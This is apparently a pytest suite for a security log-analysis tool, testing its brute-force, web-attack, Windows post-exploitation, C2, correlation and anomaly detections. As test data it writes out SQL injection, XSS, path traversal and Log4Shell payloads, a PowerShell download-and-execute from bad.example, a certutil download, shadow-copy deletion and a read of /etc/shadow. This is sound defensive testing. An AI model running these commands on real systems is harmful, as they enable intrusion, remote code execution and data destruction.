from datetime import datetime, timedelta, timezone

import httpx
import pytest

from app.analysis import Analyzer
from app.db import Database
from app.demo_data import generate
from app.detection.anomaly import detect
from app.detection.correlate import correlate
from app.detection.playbooks import STEPS, merged_steps, steps_for
from app.detection.rules import run_rules
from app.intel.service import IntelService
from app.models import Event
from app.parsers import parse_text

UTC = timezone.utc
T0 = datetime(2026, 11, 6, 10, 0, tzinfo=UTC)


def ev(sec, kind, **kw) -> Event:
    kw.setdefault("source", "linux")
    kw.setdefault("host", "web-01")
    return Event(ts=T0 + timedelta(seconds=sec), kind=kind, raw=f"{kind} line", **kw)


def rules_by_id(events):
    return {a.rule_id: a for a in run_rules(events)}


def test_brute_force_then_success_is_critical():
    events = [ev(i * 5, "auth_failure", outcome="failure", src_ip="203.0.113.9", user="root", fields={"service": "ssh"}) for i in range(12)]
    events.append(ev(70, "auth_success", outcome="success", src_ip="203.0.113.9", user="root", fields={"service": "ssh"}))
    found = rules_by_id(events)
    assert found["brute_force"].count == 12 and found["brute_force"].techniques == ["T1110.001"]
    hit = found["login_after_brute_force"]
    assert hit.severity == "critical" and hit.user == "root" and "T1078" in hit.techniques
    assert found["root_ssh_login"].severity == "high"


def test_few_failures_or_slow_failures_are_not_brute_force():
    typos = [ev(i * 5, "auth_failure", outcome="failure", src_ip="10.0.0.5", user="ravi", fields={"service": "ssh"}) for i in range(3)]
    slow = [ev(i * 3600, "auth_failure", outcome="failure", src_ip="203.0.113.10", user="root", fields={"service": "ssh"}) for i in range(10)]
    assert "brute_force" not in rules_by_id(typos + slow)


def test_repeated_lines_count_as_several_attempts():
    events = [ev(0, "auth_failure", outcome="failure", src_ip="203.0.113.9", user="root", fields={"service": "ssh", "repeat": 9})]
    assert rules_by_id(events)["brute_force"].count == 9


def test_password_spraying_is_recognised():
    users = ["alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi"]
    events = [ev(i * 4, "auth_failure", outcome="failure", src_ip="203.0.113.9", user=u, fields={"service": "ssh"}) for i, u in enumerate(users)]
    alert = rules_by_id(events)["brute_force"]
    assert alert.techniques == ["T1110.003"] and "spraying" in alert.title.lower()


def test_web_attacks_and_success_raises_severity():
    def web(sec, path, status=200, ua="Mozilla/5.0"):
        return ev(sec, "http_request", source="web", host=None, src_ip="203.0.113.7", outcome="success" if status < 400 else "failure",
                  fields={"decoded": path, "target": path, "path": path.split("?")[0], "query": path.partition("?")[2], "status": status, "user_agent": ua, "method": "GET"})
    events = [web(0, "/item?id=1' UNION SELECT user,pass FROM users-- -"), web(1, "/f?file=../../etc/passwd", 403), web(2, "/s?q=<script>alert(1)</script>"),
              web(3, "/x", 404, "sqlmap/1.8"), web(4, "/.env", 404), web(5, "/q?x=${jndi:ldap://203.0.113.7/a}", 400)]
    found = rules_by_id(events)
    assert found["sql_injection"].severity == "high"  # it got a 200
    assert found["path_traversal"].severity == "medium"  # blocked with 403
    assert {"xss", "web_scanner", "sensitive_file", "log4shell"} <= set(found)
    benign = [web(i, p) for i, p in enumerate(["/search?q=O'Reilly books", "/products?id=12", "/about", "/blog/select-the-right-shoes"])]
    assert not rules_by_id(benign)


def test_windows_post_exploitation_rules():
    def win(sec, kind, **fields):
        return ev(sec, kind, source="windows", host="PC-1", user="bob", fields=fields)
    events = [
        win(0, "powershell", script="IEX (New-Object Net.WebClient).DownloadString('http://bad.example/a.ps1')"),
        win(1, "process", command="certutil.exe -urlcache -split -f http://bad.example/x.exe C:\\Users\\Public\\x.exe"),
        win(2, "process", command="vssadmin.exe delete shadows /all /quiet"),
        win(3, "service_install", service_name="Updater", image_path="C:\\Users\\Public\\x.exe"),
        win(4, "service_install", service_name="Spooler", image_path="C:\\Windows\\System32\\spoolsv.exe"),
        win(5, "log_cleared"),
        win(6, "process", command='"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"'),
    ]
    found = run_rules(events)
    ids = [a.rule_id for a in found]
    assert ids.count("suspicious_service") == 1  # the normal service isn't flagged
    assert {"suspicious_powershell", "tool_download", "shadow_copy_delete", "log_cleared"} <= set(ids)
    assert next(a for a in found if a.rule_id == "shadow_copy_delete").severity == "critical"
    assert "T1105" in next(a for a in found if a.rule_id == "suspicious_powershell").techniques


def test_port_scan_and_c2_traffic():
    scan = [ev(i, "fw_block", source="firewall", host="gw", src_ip="203.0.113.8", dst_ip="10.0.0.2", dst_port=p, outcome="failure") for i, p in enumerate(range(20, 60))]
    c2 = [ev(100 + i, "fw_allow", source="firewall", host="gw", src_ip="10.0.0.2", dst_ip="198.51.100.9", dst_port=4444, outcome="success") for i in range(3)]
    found = rules_by_id(scan + c2)
    assert found["port_scan"].details["ports"] == 40
    assert found["suspicious_outbound"].ip == "198.51.100.9" and found["suspicious_outbound"].severity == "high"


def test_correlation_follows_the_attacker_into_the_session():
    events = [ev(i * 5, "auth_failure", outcome="failure", src_ip="203.0.113.9", user="deploy", fields={"service": "ssh"}) for i in range(10)]
    events.append(ev(60, "auth_success", outcome="success", src_ip="203.0.113.9", user="deploy", fields={"service": "ssh"}))
    events.append(ev(120, "sudo", outcome="success", user="deploy", fields={"command": "/usr/sbin/useradd -m backup", "target_user": "root"}))
    events.append(ev(121, "user_created", outcome="success", user="backup", fields={"new_user": "backup"}))
    events.append(ev(200, "sudo", outcome="success", host="db-02", user="deploy", fields={"command": "/usr/bin/cat /etc/shadow"}))  # another machine
    incidents = correlate(run_rules(events), events)
    main = incidents[0]
    rules = {a.rule_id for a in main.alerts}
    assert {"brute_force", "login_after_brute_force", "sudo_sensitive_command", "user_created"} <= rules
    assert main.severity == "critical" and main.ips == ["203.0.113.9"] and main.hosts == ["web-01"]
    assert "Account break-in" in main.title
    assert all("db-02" not in (a.host or "") for a in main.alerts)


@pytest.fixture
def demo_db(tmp_path, settings):
    db = Database(tmp_path / "demo.db")
    files = generate(datetime.now(UTC), UTC)
    for name, text in files.items():
        r = parse_text(text, UTC)
        db.add_dataset(name, r.format, r.source, len(text), r.lines, r.events, r.samples_skipped, demo=True)
    intel = IntelService(settings, db, httpx.AsyncClient())
    summary = Analyzer(db, intel).run()
    return db, summary


def test_demo_story_is_detected_end_to_end(demo_db):
    db, summary = demo_db
    incidents = db.incidents()
    titles = [i["title"] for i in incidents]
    web = next(i for i in incidents if "203.0.113.45" in i["ips"])
    pc = next(i for i in incidents if "198.51.100.23" in i["ips"])
    assert web["severity"] == pc["severity"] == "critical"
    assert web["hosts"] == ["web-01"] and pc["hosts"] == ["WS-FIN-07"]
    assert {"Reconnaissance", "Initial Access", "Credential Access", "Persistence", "Command and Control"} <= set(web["tactics"])
    assert {"Execution", "Persistence", "Defense Evasion", "Impact"} <= set(pc["tactics"])
    assert "198.51.100.200" in web["ips"]  # the C2 server joined via the cron job's URL
    alerts = {a["id"]: a for a in db.alerts()}
    pc_rules = {alerts[i]["rule_id"] for i in pc["alert_ids"]}
    assert {"suspicious_service", "malicious_file", "malicious_domain", "shadow_copy_delete", "log_cleared"} <= pc_rules
    assert any(i["title"].startswith("Vulnerability scanning") for i in incidents)
    ml = [a for a in alerts.values() if a["rule_id"] == "ml_anomaly"]
    assert [a["ip"] for a in ml] == ["198.51.100.88"]  # the slow password bot no rule catches
    assert summary["by_severity"]["critical"] >= 3
    assert len(titles) == 4


def test_anomaly_model_explains_itself():
    events = []
    for n in range(30):
        ip = f"192.0.2.{n + 1}"
        events += [ev(n * 60 + i, "http_request", source="web", src_ip=ip, outcome="success", fields={"path": f"/p{i % 3}", "status": 200}) for i in range(5)]
    events += [ev(9000 + i, "http_request", source="web", src_ip="203.0.113.99", outcome="failure", fields={"path": f"/x{i}", "status": 404}) for i in range(300)]
    found = detect(events)
    top = found[0]
    assert top.ip == "203.0.113.99" and top.outlier and top.score > 0.7
    assert any("different URLs" in r for r in top.reasons)
    assert not any(a.outlier for a in found if a.ip != "203.0.113.99")
    assert detect(events[:20]) == []  # too few IPs to compare


def test_playbook_templates_all_format():
    from app.models import Alert

    for rule_id in STEPS:
        for source in ("linux", "windows"):
            a = Alert(rule_id, "t", "s", "high", source, [], T0, T0, "d", [], ip="203.0.113.9", user="bob", host="h")
            for step in steps_for(a):
                assert "{" not in step["action"]
    alerts = [Alert("brute_force", "t", "s", "medium", "linux", [], T0, T0, "d", [], ip="203.0.113.9"),
              Alert("port_scan", "t", "s", "medium", "firewall", [], T0, T0, "d", [], ip="203.0.113.9")]
    merged = merged_steps(alerts)
    assert len([s for s in merged if s["command"] == "sudo ufw deny from 203.0.113.9"]) == 1
